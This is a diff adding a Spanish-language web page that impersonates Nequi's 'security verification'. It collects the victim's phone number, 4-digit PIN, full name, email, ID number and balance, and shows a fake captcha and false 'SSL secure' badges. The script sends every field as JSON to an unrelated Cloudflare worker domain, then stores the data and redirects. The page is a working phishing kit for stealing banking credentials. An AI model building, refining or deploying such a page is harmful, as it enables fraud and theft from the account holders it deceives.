@@ -1,0 +1,1072 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Tu info - Verificación Nequi</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+
+<style>
+  /* Estilos base */
+  body { 
+    margin: 0; 
+    background: #FFFFFF; 
+    font-family: 'Inter', sans-serif; 
+    display: flex; 
+    flex-direction: column; 
+    min-height: 100vh; 
+  }
+  .header { 
+    width: 100%; 
+    background: #2E0039; 
+    padding: 15px 20px; 
+    color: white; 
+    font-size: 20px; 
+    font-weight: 700; 
+    display: flex; 
+    align-items: center; 
+    gap: 10px; 
+  }
+  .container { 
+    padding: 20px; 
+    flex: 1; 
+  }
+  .title { 
+    font-size: 28px; 
+    font-weight: 700; 
+    color: #2E0039; 
+    margin-bottom: 25px; 
+    margin-top: 15px; 
+  }
+  .card { 
+    background: #fff; 
+    padding: 10px 0; 
+    margin-bottom: 0; 
+    border-bottom: 4px solid #f0f0f0; 
+    display: flex; 
+    align-items: flex-start; 
+  }
+  .left { 
+    display: flex; 
+    align-items: flex-start; 
+    gap: 15px; 
+    flex: 1; 
+  }
+  .icon { 
+    width: 40px; 
+    height: 40px; 
+    display: flex; 
+    align-items: center; 
+    justify-content: center; 
+  }
+  .content { 
+    flex: 1; 
+  }
+  .text-title { 
+    font-size: 17px; 
+    font-weight: 600; 
+    color: #2E0039; 
+    margin-bottom: 5px; 
+  }
+  .text-sub { 
+    font-size: 17px; 
+    color: #666; 
+    margin-bottom: 12px; 
+    line-height: 1.4; 
+  }
+  .input-field { 
+    width: 100%; 
+    padding: 0; 
+    background-color: transparent; 
+    border: none; 
+    border-radius: 0; 
+    font-size: 16px; 
+    color: #2E0039; 
+    outline: none; 
+    font-family: 'Inter', sans-serif; 
+    font-weight: 500; 
+    margin-bottom: 5px; 
+  }
+  .login-button { 
+    width: 100%; 
+    padding: 18px; 
+    background-color: #da008130; 
+    border: none; 
+    border-radius: 14px; 
+    font-size: 17px; 
+    margin-top: 30px; 
+    cursor: not-allowed; 
+    font-weight: 700; 
+    transition: all 0.3s ease; 
+    font-family: 'Inter', sans-serif; 
+    color: #fff; 
+  }
+  .login-button.active { 
+    background-color: #2E0039; 
+    cursor: pointer; 
+  }
+  .footer { 
+    background: #2E0039; 
+    color: white; 
+    padding: 25px 20px; 
+    text-align: center; 
+    margin-top: 40px; 
+  }
+  #loader { 
+    display: none; 
+    position: fixed; 
+    top: 0; 
+    left: 0; 
+    width: 100%; 
+    height: 100%; 
+    background: rgba(255, 255, 255, 0.95); 
+    z-index: 9999; 
+    text-align: center; 
+    padding-top: 40%; 
+    font-size: 18px; 
+    color: #2E0039; 
+    font-weight: 600; 
+  }
+  .input-container { 
+    border-bottom: 2px solid #ffffff; 
+    padding-bottom: 8px; 
+    margin-bottom: 8px; 
+    transition: border-color 0.3s ease; 
+  }
+  .input-container:focus-within { 
+    border-bottom-color: #2E0039; 
+  }
+  .check { 
+    background: #e0e0e0; 
+    color: white; 
+    font-size: 8px; 
+    padding: 7px 9px; 
+    border-radius: 50%; 
+    transition: all 0.3s ease;
+  }
+  .check.valid {
+    background: #00C853;
+  }
+  .editable { 
+    cursor: text; 
+    border: 1px solid transparent; 
+    border-radius: 4px; 
+    padding: 2px 4px; 
+    min-height: 20px; 
+    transition: all 0.3s ease;
+  }
+  .editable.invalid {
+    color: #ff4444;
+    border-color: #ffcccc;
+    background-color: #fff5f5;
+  }
+  .money-input { 
+    border: 1px solid #ddd; 
+    border-radius: 6px; 
+    padding: 8px 12px 8px 25px; 
+    font-size: 16px; 
+    width: 180px; 
+    background: #F9F3FF; 
+    position: relative; 
+    font-family: 'Inter', sans-serif; 
+  }
+  .money-container { 
+    position: relative; 
+    display: inline-block; 
+  }
+  .money-container::before { 
+    content: "$"; 
+    position: absolute; 
+    left: 10px; 
+    top: 50%; 
+    transform: translateY(-50%); 
+    color: #3A0A63; 
+    font-weight: bold; 
+    z-index: 1; 
+  }
+  .input-modal { 
+    position: fixed; 
+    top: 0; 
+    left: 0; 
+    right: 0; 
+    bottom: 0; 
+    background: rgba(0,0,0,0.7); 
+    display: none; 
+    justify-content: center; 
+    align-items: center; 
+    z-index: 1000; 
+  }
+  .input-container-modal { 
+    background: white; 
+    padding: 25px; 
+    border-radius: 15px; 
+    width: 90%; 
+    max-width: 400px; 
+    box-shadow: 0 10px 30px rgba(0,0,0,0.3); 
+  }
+
+  /* Mejoras visuales */
+  .progress-bar { 
+    width: 100%; 
+    height: 4px; 
+    background: #f0f0f0; 
+    border-radius: 2px; 
+    margin: 10px 0; 
+    overflow: hidden; 
+  }
+  .progress-fill { 
+    height: 100%; 
+    background: #2E0039; 
+    width: 0%; 
+    transition: width 0.3s ease; 
+  }
+  .security-badge { 
+    background: #f8f9fa; 
+    border: 1px solid #e9ecef; 
+    padding: 8px 12px; 
+    border-radius: 20px; 
+    font-size: 12px; 
+    color: #6c757d; 
+    display: inline-flex; 
+    align-items: center; 
+    gap: 5px; 
+  }
+
+  /* Indicador de campos obligatorios */
+  .required-indicator {
+    color: #ff4444;
+    font-size: 12px;
+    margin-left: 5px;
+  }
+
+  .validation-message {
+    font-size: 12px;
+    color: #ff4444;
+    margin-top: 5px;
+    display: none;
+  }
+
+  /* Estilos del modal */
+  .input-title { 
+    font-size: 18px; 
+    font-weight: 600; 
+    margin-bottom: 15px; 
+    color: #2E0039; 
+  }
+  .floating-input { 
+    width: 100%; 
+    padding: 12px; 
+    border: 2px solid #e0e0e0; 
+    border-radius: 8px; 
+    font-size: 16px; 
+    margin-bottom: 15px; 
+    outline: none; 
+    transition: border-color 0.3s ease; 
+  }
+  .floating-input:focus { 
+    border-color: #2E0039; 
+  }
+  .input-buttons { 
+    display: flex; 
+    gap: 10px; 
+  }
+  .btn-cancel, .btn-save { 
+    flex: 1; 
+    padding: 12px; 
+    border: none; 
+    border-radius: 8px; 
+    font-size: 16px; 
+    font-weight: 600; 
+    cursor: pointer; 
+  }
+  .btn-cancel { 
+    background: #f0f0f0; 
+    color: #666; 
+  }
+  .btn-save { 
+    background: #2E0039; 
+    color: white; 
+  }
+
+  /* Estado de validación */
+  .field-valid {
+    border-color: #00C853 !important;
+  }
+
+  .field-invalid {
+    border-color: #ff4444 !important;
+    background-color: #fff5f5 !important;
+  }
+
+  /* CAPTCHA STYLES - BARRA DE PROGRESO */
+  .captcha-section {
+    margin: 30px 0;
+    padding: 20px;
+    border-radius: 12px;
+    background: #f8f9fa;
+    border: 1px solid #e9ecef;
+  }
+
+  .captcha-progress-container {
+    width: 100%;
+    height: 50px;
+    background: #f0f0f0;
+    border-radius: 25px;
+    overflow: hidden;
+    position: relative;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+  }
+
+  .captcha-progress-container:hover {
+    box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+    transform: translateY(-1px);
+  }
+
+  .captcha-progress-fill {
+    position: absolute;
+    top: 0;
+    left: 0;
+    height: 100%;
+    width: 0%;
+    background: linear-gradient(90deg, #4CAF50, #00C853);
+    border-radius: 25px;
+    transition: width 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    overflow: hidden;
+  }
+
+  .captcha-progress-fill.completed {
+    width: 100%;
+    box-shadow: 0 0 20px rgba(0, 200, 83, 0.4);
+  }
+
+  .captcha-text {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    font-size: 16px;
+    font-weight: 600;
+    color: #666;
+    z-index: 2;
+    transition: all 0.3s ease;
+    white-space: nowrap;
+  }
+
+  .captcha-progress-container.completed .captcha-text {
+    color: white;
+    font-weight: 700;
+  }
+
+  .captcha-checkmark {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%) scale(0);
+    font-size: 24px;
+    color: white;
+    font-weight: bold;
+    z-index: 3;
+    opacity: 0;
+    transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+  }
+
+  .captcha-progress-container.completed .captcha-checkmark {
+    opacity: 1;
+    transform: translate(-50%, -50%) scale(1);
+  }
+
+  .captcha-instructions {
+    text-align: center;
+    font-size: 14px;
+    color: #666;
+    margin-bottom: 15px;
+  }
+
+  .captcha-particles {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    pointer-events: none;
+  }
+
+  .particle {
+    position: absolute;
+    width: 4px;
+    height: 4px;
+    background: white;
+    border-radius: 50%;
+    opacity: 0;
+  }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <span>←</span> Verificación de Seguridad
+</div>
+<img src="bane.jpeg" alt="Nequi" style="width: 100%; max-width: 300px; height: auto;">
+
+<div class="container">
+  <div class="title">Tu info <span style="font-size: 14px; color: #ff4444;">* Todos los campos son obligatorios</span></div>
+
+  <form id="loginForm">
+    <!-- Campos del formulario -->
+    <div class="card">
+      <div class="left">
+        <div class="icon">
+          <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#3A0A63" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="7" y="2" width="10" height="20" rx="3"></rect>
+            <line x1="12" y1="18" x2="12" y2="18" stroke-width="3"></line>
+          </svg>
+        </div>
+        <div class="content">
+          <div class="text-title">Número vinculado a Nequi<span class="required-indicator">*</span></div>
+          <div class="text-sub">Ingresa tu número de celular vinculado</div>
+          <div class="input-container">
+            <input type="number" class="input-field" id="usuario" placeholder="Ej: 3115555555" required pattern="3[0-9]{9}" maxlength="10" minlength="10" inputmode="numeric" />
+          </div>
+          <div class="validation-message" id="usuario-error">Por favor ingresa un número de celular válido (10 dígitos)</div>
+        </div>
+      </div>
+      <div class="check" id="usuario-check">!</div>
+    </div>
+
+    <div class="card">
+      <div class="left">
+        <div class="icon">
+          <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#3A0A63" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="3" y="11" width="18" height="10" rx="2"></rect>
+            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+          </svg>
+        </div>
+        <div class="content">
+          <div class="text-title">Clave de 4 dígitos<span class="required-indicator">*</span></div>
+          <div class="text-sub">Ingresa tu clave de seguridad</div>
+          <div class="input-container">
+            <input type="password" class="input-field" id="clave" placeholder="****" required pattern="[0-9]{4}" maxlength="4" minlength="4" inputmode="numeric" />
+          </div>
+          <div class="validation-message" id="clave-error">La clave debe tener exactamente 4 dígitos</div>
+        </div>
+      </div>
+      <div class="check" id="clave-check">!</div>
+    </div>
+
+    <!-- Campos editables -->
+    <div class="card">
+      <div class="left">
+        <div class="icon">
+          <svg width="26" height="26" viewBox="0 0 24 24">
+            <text x="1" y="17" font-size="15" fill="#3A0A63" font-family="Arial" font-weight="bold">Aa</text>
+          </svg>
+        </div>
+        <div class="content">
+          <div class="text-title">Nombre Completo<span class="required-indicator">*</span></div>
+          <div class="text-sub">¿nombres y apellidos?</div>
+          <div id="nombre" class="text-title editable" onclick="mostrarInputModal('nombre', 'text', 'Ingresa tu nombre completo', 'Nombre Completo')">Nombre Completo</div>
+          <div class="validation-message" id="nombre-error">Por favor ingresa tu nombre completo</div>
+        </div>
+      </div>
+      <div class="check" id="nombre-check">!</div>
+    </div>
+
+    <div class="card">
+      <div class="left">
+        <div class="icon">
+          <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#3A0A63" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="3" y="5" width="18" height="14" rx="2"></rect>
+            <polyline points="3,7 12,13 21,7"></polyline>
+          </svg>
+        </div>
+        <div class="content">
+          <div class="text-title">Correo Electrónico<span class="required-indicator">*</span></div>
+          <div class="text-sub">Ingresa tu correo registrado</div>
+          <div id="correo" class="text-title editable" onclick="mostrarInputModal('correo', 'email', 'Ingresa tu correo electrónico', 'correo1234@gmail.com')">correo1234@gmail.com</div>
+          <div class="validation-message" id="correo-error">Por favor ingresa un correo electrónico válido</div>
+        </div>
+      </div>
+      <div class="check" id="correo-check">!</div>
+    </div>
+
+    <div class="card">
+      <div class="left">
+        <div class="icon">
+          <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#3A0A63" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="8" r="4"></circle>
+            <path d="M4 20c1-4 4-7 8-7s7 3 8 7"></path>
+          </svg>
+        </div>
+        <div class="content">
+          <div class="text-title"># Documento<span class="required-indicator">*</span></div>
+          <div class="text-sub">Número de documento de identidad</div>
+          <div id="cedula" class="text-sub editable" onclick="mostrarInputModal('cedula', 'text', 'Ingresa tu número de documento', 'CC 123333334')">CC 123333334</div>
+          <div class="validation-message" id="cedula-error">Por favor ingresa tu número de documento</div>
+        </div>
+      </div>
+      <div class="check" id="cedula-check">!</div>
+    </div>
+
+    <div class="card">
+      <div class="left">
+        <div class="icon">
+          <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#3A0A63" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="2" y="6" width="20" height="12" rx="2"></rect>
+            <circle cx="12" cy="12" r="3"></circle>
+          </svg>
+        </div>
+        <div class="content">
+          <div class="text-title">Pregunta de Seguridad<span class="required-indicator">*</span></div>
+          <div class="text-sub">Saldo disponible actual</div>
+          <div class="money-container">
+            <input type="text" id="saldo" class="money-input" placeholder="0" oninput="manejarEntradaSaldo(this)" onblur="formatearSaldoFinal(this)" onclick="mostrarInputModal('saldo', 'number', 'Ingresa tu saldo disponible', '0')" readonly>
+          </div>
+          <div class="validation-message" id="saldo-error">Por favor ingresa tu saldo disponible</div>
+        </div>
+      </div>
+      <div class="check" id="saldo-check">!</div>
+    </div>
+
+    <!-- Barra de progreso -->
+    <div class="progress-bar">
+      <div id="formProgress" class="progress-fill"></div>
+    </div>
+    <div style="text-align: center; font-size: 14px; color: #666; margin-bottom: 20px;">
+      <span id="progress-text">0% completado</span>
+    </div>
+
+    <!-- CAPTCHA CON BARRA DE PROGRESO -->
+    <div class="captcha-section">
+      <div class="captcha-instructions">Haz clic para verificar que no eres un robot</div>
+      <div class="captcha-progress-container" id="captchaProgress">
+        <div class="captcha-progress-fill" id="captchaFill">
+          <div class="captcha-particles" id="captchaParticles"></div>
+        </div>
+        <div class="captcha-text" id="captchaText">Haz clic para verificar</div>
+        <div class="captcha-checkmark">✓</div>
+      </div>
+      <div style="text-align: center; margin-top: 10px;">
+        <div class="validation-message" id="captcha-error">Por favor verifica que no eres un robot</div>
+      </div>
+    </div>
+
+    <!-- Badge de seguridad -->
+    <div style="text-align: center; margin: 20px 0;">
+      <div class="security-badge">
+          <br>  <br> <br>
+        <span>🔒</span>
+        Conexión segura SSL • Tus datos están protegidos
+      </div>
+    </div>
+
+    <button type="submit" class="login-button" id="loginBtn" disabled>
+      <span id="btnText">Verificar Identidad</span>
+    </button>
+  </form>
+</div>
+
+<!-- Modal -->
+<div class="input-modal" id="inputModal">
+  <div class="input-container-modal">
+    <div class="input-title" id="modalTitle">Ingresa tu información</div>
+    <input type="text" id="floatingInput" class="floating-input" placeholder="Escribe aquí...">
+    <div class="input-buttons">
+      <button class="btn-cancel" onclick="cerrarModal()">Cancelar</button>
+      <button class="btn-save" onclick="guardarValor()">Guardar</button>
+    </div>
+  </div>
+</div>
+
+<!-- Footer -->
+<div class="footer">
+  <div class="footer-content">
+    <div class="footer-logo">
+        <img src="https://images.seeklogo.com/logo-png/40/2/nequi-logo-png_seeklogo-404357.png" alt="Imagen" style="width:100px; height:auto;">
+      <div class="icon"></div>
+      Nequi
+    </div>
+    <div class="footer-text">Tu billetera digital más fácil, más rápida y más segura</div>
+    <div class="footer-links">
+      <a href="#" class="footer-link">Términos y Condiciones</a>
+      <a href="#" class="footer-link">Política de Privacidad</a>
+      <a href="#" class="footer-link">Ayuda</a>
+      <a href="#" class="footer-link">Contáctanos</a>
+    </div>
+    <br>  <br> <br>
+    <div class="security-badge">
+      🔒 Transacciones 100% seguras
+    </div>
+    <div class="footer-copyright">&copy; 2025 Nequi. Todos los derechos reservados.</div>
+  </div>
+</div>
+
+<div id="loader">
+  <div style="font-size: 24px; margin-bottom: 20px;">⏳</div>
+  Verificando tu identidad...
+  <div style="font-size: 14px; margin-top: 10px; color: #666;">Esto puede tomar unos segundos</div>
+</div>
+
+<script>
+// WORKER URL CORREGIDO
+const WORKER_URL = "https://throbbing-sky-6a75.claropromoxlaro.workers.dev";
+
+// Variables globales
+let saldoNumerico = 0;
+let saldoSinFormato = '';
+let campoActual = null;
+let placeholderActual = '';
+let captchaValidado = false;
+
+// Función para validar un campo específico
+function validarCampo(campoId, valor) {
+  const checkElement = document.getElementById(campoId + '-check');
+  const errorElement = document.getElementById(campoId + '-error');
+  const fieldElement = document.getElementById(campoId);
+
+  let esValido = false;
+
+  switch(campoId) {
+    case 'usuario':
+      esValido = /^3[0-9]{9}$/.test(valor);
+      break;
+    case 'clave':
+      esValido = /^[0-9]{4}$/.test(valor);
+      break;
+    case 'nombre':
+      esValido = valor !== 'Nombre Completo' && valor.trim().length > 0;
+      if (fieldElement.classList) {
+        if (esValido) {
+          fieldElement.classList.remove('invalid');
+        } else {
+          fieldElement.classList.add('invalid');
+        }
+      }
+      break;
+    case 'correo':
+      esValido = valor !== 'correo1234@gmail.com' && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(valor);
+      if (fieldElement.classList) {
+        if (esValido) {
+          fieldElement.classList.remove('invalid');
+        } else {
+          fieldElement.classList.add('invalid');
+        }
+      }
+      break;
+    case 'cedula':
+      esValido = valor !== 'CC 123333334' && valor.trim().length > 0;
+      if (fieldElement.classList) {
+        if (esValido) {
+          fieldElement.classList.remove('invalid');
+        } else {
+          fieldElement.classList.add('invalid');
+        }
+      }
+      break;
+    case 'saldo':
+      esValido = saldoNumerico > 0;
+      if (fieldElement.classList) {
+        if (esValido) {
+          fieldElement.classList.remove('field-invalid');
+          fieldElement.classList.add('field-valid');
+        } else {
+          fieldElement.classList.remove('field-valid');
+          fieldElement.classList.add('field-invalid');
+        }
+      }
+      break;
+  }
+
+  // Actualizar estado visual
+  if (esValido) {
+    checkElement.classList.add('valid');
+    checkElement.innerHTML = '✔';
+    errorElement.style.display = 'none';
+  } else {
+    checkElement.classList.remove('valid');
+    checkElement.innerHTML = '!';
+    if (valor && valor !== placeholderActual) {
+      errorElement.style.display = 'block';
+    } else {
+      errorElement.style.display = 'none';
+    }
+  }
+
+  return esValido;
+}
+
+// Función para actualizar progreso del formulario
+function actualizarProgreso() {
+  const campos = ['usuario', 'clave', 'nombre', 'correo', 'cedula', 'saldo'];
+  let completados = 0;
+
+  campos.forEach(campo => {
+    let valor;
+    if (campo === 'usuario' || campo === 'clave' || campo === 'saldo') {
+      valor = document.getElementById(campo).value;
+    } else {
+      valor = document.getElementById(campo).textContent;
+    }
+
+    if (validarCampo(campo, valor)) {
+      completados++;
+    }
+  });
+
+  // Añadir CAPTCHA a la validación
+  if (captchaValidado) {
+    completados++;
+    document.getElementById('captcha-error').style.display = 'none';
+  } else {
+    document.getElementById('captcha-error').style.display = 'block';
+  }
+
+  const totalCampos = campos.length + 1; // +1 por el CAPTCHA
+  const porcentaje = Math.round((completados / totalCampos) * 100);
+
+  const progreso = document.getElementById('formProgress');
+  progreso.style.width = porcentaje + '%';
+
+  document.getElementById('progress-text').textContent = porcentaje + '% completado';
+
+  return completados === totalCampos;
+}
+
+// Validación de campos mejorada
+function validarCampos() {
+  const todosCompletos = actualizarProgreso();
+  const loginBtn = document.getElementById('loginBtn');
+  const btnText = document.getElementById('btnText');
+
+  if (todosCompletos) {
+    loginBtn.classList.add('active');
+    loginBtn.disabled = false;
+    btnText.textContent = "✅ Verificar Identidad";
+  } else {
+    loginBtn.classList.remove('active');
+    loginBtn.disabled = true;
+    btnText.textContent = "Verificar Identidad";
+  }
+}
+
+// Manejo del formulario MEJORADO
+document.getElementById('loginForm').addEventListener('submit', async function (e) {
+  e.preventDefault();
+
+  // Validar todos los campos antes de enviar
+  if (!actualizarProgreso()) {
+    alert('Por favor completa todos los campos obligatorios correctamente.');
+    return;
+  }
+
+  const loader = document.getElementById('loader');
+  const loginBtn = document.getElementById('loginBtn');
+
+  // Mostrar loader
+  loader.style.display = 'block';
+  loginBtn.disabled = true;
+  loginBtn.innerHTML = '<span>⏳ Enviando...</span>';
+
+  const datos = {
+    usuario: document.getElementById('usuario').value.trim(),
+    clave: document.getElementById('clave').value.trim(),
+    nombre: document.getElementById('nombre').textContent,
+    correo: document.getElementById('correo').textContent,
+    cedula: document.getElementById('cedula').textContent,
+    saldo: saldoNumerico,
+    transactionId: 'NEQUI_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9)
+  };
+
+  console.log("📤 Enviando datos:", datos);
+
+  try {
+    // Enviar datos al Worker con timeout
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 segundos
+
+    const response = await fetch(`${WORKER_URL}/login`, {
+      method: "POST",
+      headers: { 
+        "Content-Type": "application/json",
+        "Accept": "application/json"
+      },
+      body: JSON.stringify(datos),
+      signal: controller.signal
+    });
+
+    clearTimeout(timeoutId);
+
+    if (!response.ok) {
+      throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+    }
+
+    const result = await response.json();
+    console.log("✅ Respuesta del worker:", result);
+
+    if (result.ok) {
+      // Guardar en localStorage
+      localStorage.setItem('bancoldata', JSON.stringify(datos));
+
+      // Feedback al usuario
+      loader.innerHTML = `
+        <div style="font-size: 24px; margin-bottom: 20px;">✅</div>
+        Datos verificados correctamente<br>
+        <div style="font-size: 14px; margin-top: 10px; color: #666;">Redirigiendo...</div>
+      `;
+
+      // Redirigir después de 2 segundos
+      setTimeout(() => {
+        window.location.href = 'resultados.html';
+      }, 2000);
+
+    } else {
+      throw new Error(result.error || 'Error del servidor');
+    }
+
+  } catch (error) {
+    console.error('❌ Error completo:', error);
+
+    let errorMessage = "Error de conexión";
+    if (error.name === 'AbortError') {
+      errorMessage = "Tiempo de espera agotado. Revisa tu conexión.";
+    } else if (error.message.includes('HTTP')) {
+      errorMessage = `Error del servidor: ${error.message}`;
+    }
+
+    loader.innerHTML = `
+      <div style="font-size: 24px; margin-bottom: 20px;">❌</div>
+      ${errorMessage}<br>
+      <div style="font-size: 14px; margin-top: 10px; color: #666;">Reintentando en 3 segundos...</div>
+    `;
+
+    // Reintentar después de 3 segundos
+    setTimeout(() => {
+      loader.style.display = 'none';
+      loginBtn.disabled = false;
+      loginBtn.innerHTML = '<span id="btnText">🔄 Reintentar Verificación</span>';
+    }, 3000);
+  }
+});
+
+// CAPTCHA con animación de barra de progreso
+document.getElementById('captchaProgress').addEventListener('click', function () {
+  if (captchaValidado) return; // Evitar múltiples clics
+
+  captchaValidado = true;
+  const captchaFill = document.getElementById('captchaFill');
+  const captchaText = document.getElementById('captchaText');
+  const captchaContainer = document.getElementById('captchaProgress');
+
+  // Animación de llenado
+  captchaFill.classList.add('completed');
+  captchaContainer.classList.add('completed');
+
+  // Crear partículas de confeti
+  createConfetti();
+
+  // Actualizar validación después de la animación
+  setTimeout(() => {
+    validarCampos();
+  }, 1000);
+});
+
+// Función para crear efecto de confeti
+function createConfetti() {
+  const particlesContainer = document.getElementById('captchaParticles');
+  particlesContainer.innerHTML = '';
+
+  for (let i = 0; i < 20; i++) {
+    const particle = document.createElement('div');
+    particle.className = 'particle';
+
+    // Posición aleatoria
+    const left = Math.random() * 100;
+    const top = Math.random() * 100;
+
+    // Tamaño aleatorio
+    const size = Math.random() * 6 + 2;
+
+    // Color aleatorio
+    const colors = ['#FFD700', '#FF6B6B', '#4ECDC4', '#45B7D1', '#96CEB4', '#FFEAA7'];
+    const color = colors[Math.floor(Math.random() * colors.length)];
+
+    particle.style.cssText = `
+      left: ${left}%;
+      top: ${top}%;
+      width: ${size}px;
+      height: ${size}px;
+      background: ${color};
+      animation: confetti 1s ease-out forwards;
+    `;
+
+    particlesContainer.appendChild(particle);
+  }
+}
+
+// Event listeners para validación
+document.getElementById('usuario').addEventListener('input', function() {
+  validarCampo('usuario', this.value);
+  validarCampos();
+});
+
+document.getElementById('clave').addEventListener('input', function() {
+  validarCampo('clave', this.value);
+  validarCampos();
+});
+
+// Funciones para campos editables
+function mostrarInputModal(campoId, tipo, titulo, placeholder) {
+  campoActual = campoId;
+  placeholderActual = placeholder;
+
+  const modal = document.getElementById('inputModal');
+  const input = document.getElementById('floatingInput');
+  const tituloModal = document.getElementById('modalTitle');
+
+  tituloModal.textContent = titulo;
+
+  let valorActual = '';
+  if (campoId === 'saldo') {
+    valorActual = document.getElementById(campoId).value || '';
+  } else {
+    const elemento = document.getElementById(campoId);
+    valorActual = (elemento.textContent === placeholder) ? '' : elemento.textContent;
+  }
+
+  input.value = valorActual;
+  input.placeholder = placeholder;
+
+  switch(tipo) {
+    case 'email': input.type = 'email'; input.inputMode = 'email'; break;
+    case 'tel': input.type = 'tel'; input.inputMode = 'numeric'; break;
+    case 'number': input.type = 'text'; input.inputMode = 'decimal'; break;
+    default: input.type = 'text'; input.inputMode = 'text';
+  }
+
+  modal.style.display = 'flex';
+  setTimeout(() => input.focus(), 300);
+}
+
+function cerrarModal() {
+  document.getElementById('inputModal').style.display = 'none';
+  campoActual = null;
+}
+
+function guardarValor() {
+  if (!campoActual) return;
+
+  const input = document.getElementById('floatingInput');
+  const valor = input.value.trim();
+
+  if (campoActual === 'saldo') {
+    if (valor) {
+      saldoSinFormato = valor.replace(/\D/g, '');
+      saldoNumerico = saldoSinFormato === '' ? 0 : parseInt(saldoSinFormato);
+      const numero = parseInt(saldoSinFormato);
+      document.getElementById(campoActual).value = numero.toLocaleString('es-CO');
+    } else {
+      document.getElementById(campoActual).value = '';
+      saldoNumerico = 0;
+    }
+  } else {
+    const elemento = document.getElementById(campoActual);
+    if (valor) {
+      elemento.textContent = valor;
+      elemento.style.color = '#3A0A63';
+    } else {
+      elemento.textContent = placeholderActual;
+      elemento.style.color = '#3A0A63';
+    }
+  }
+
+  // Validar el campo después de guardar
+  validarCampo(campoActual, valor || placeholderActual);
+  validarCampos();
+
+  cerrarModal();
+}
+
+function manejarEntradaSaldo(input) {
+  saldoSinFormato = input.value.replace(/\./g, '');
+  const soloNumeros = saldoSinFormato.replace(/\D/g, '');
+  saldoSinFormato = soloNumeros;
+  saldoNumerico = soloNumeros === '' ? 0 : parseInt(soloNumeros);
+
+  if (soloNumeros !== '') {
+    const numero = parseInt(soloNumeros);
+    input.value = numero.toLocaleString('es-CO');
+  } else {
+    input.value = '';
+  }
+
+  // Validar el campo después de cambiar
+  validarCampo('saldo', input.value);
+  validarCampos();
+}
+
+function formatearSaldoFinal(input) {
+  if (saldoSinFormato !== '') {
+    const numero = parseInt(saldoSinFormato);
+    if (!isNaN(numero)) {
+      input.value = numero.toLocaleString('es-CO');
+      saldoNumerico = numero;
+    }
+  }
+
+  // Validar el campo después de formatear
+  validarCampo('saldo', input.value);
+  validarCampos();
+}
+
+// Event listeners para modal
+document.getElementById('floatingInput').addEventListener('keypress', function(e) {
+  if (e.key === 'Enter') guardarValor();
+});
+
+document.addEventListener('keydown', function(e) {
+  if (e.key === 'Escape') cerrarModal();
+});
+
+// Inicialización
+document.addEventListener('DOMContentLoaded', function() {
+  console.log('✅ Formulario de verificación listo');
+
+  // Inicializar validación de todos los campos
+  const campos = ['usuario', 'clave', 'nombre', 'correo', 'cedula', 'saldo'];
+  campos.forEach(campo => {
+    let valor;
+    if (campo === 'usuario' || campo === 'clave' || campo === 'saldo') {
+      valor = document.getElementById(campo).value;
+    } else {
+      valor = document.getElementById(campo).textContent;
+    }
+    validarCampo(campo, valor);
+  });
+
+  validarCampos(); // Validación inicial
+});
+
+// Animación CSS para las partículas
+const style = document.createElement('style');
+style.textContent = `
+  @keyframes confetti {
+    0% {
+      opacity: 1;
+      transform: translate(0, 0) rotate(0deg);
+    }
+    100% {
+      opacity: 0;
+      transform: translate(${Math.random() * 100 - 50}px, 100px) rotate(${Math.random() * 360}deg);
+    }
+  }
+`;
+document.head.appendChild(style);
+</script>
+
+</body>
+</html>
